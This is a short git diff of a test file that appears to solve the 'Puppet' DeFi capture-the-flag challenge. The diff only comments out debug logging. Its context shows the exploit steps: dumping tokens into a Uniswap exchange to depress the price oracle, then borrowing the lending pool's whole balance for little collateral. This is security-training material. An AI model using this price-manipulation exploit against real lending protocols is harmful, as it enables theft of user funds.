@@ -151,7 +151,7 @@ describe('[Challenge] Puppet', function () {
       .connect(attacker)
       .approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE)
     const deadline = Math.floor((Date.now() / 1e3) * 2)
-    console.log(deadline)
+    //console.log(deadline)
     /*await this.token
       .connect(attacker)
       .transfer(
@@ -161,14 +161,14 @@ describe('[Challenge] Puppet', function () {
     await this.uniswapExchange
       .connect(attacker)
       .tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), 1, deadline)
-    console.log((await this.token.balanceOf(attacker.address)).toString())
-    console.log((await ethers.provider.getBalance(attacker.address)).toString())
+    //console.log((await this.token.balanceOf(attacker.address)).toString())
+    //console.log((await ethers.provider.getBalance(attacker.address)).toString())
     const price = await this.lendingPool
       .connect(attacker)
       .calculateDepositRequired(
         await this.token.balanceOf(this.lendingPool.address)
       )
-    console.log('price: ', price.toString())
+    //console.log('price: ', price.toString())
     await this.lendingPool
       .connect(attacker)
       .borrow(await this.token.balanceOf(this.lendingPool.address), {
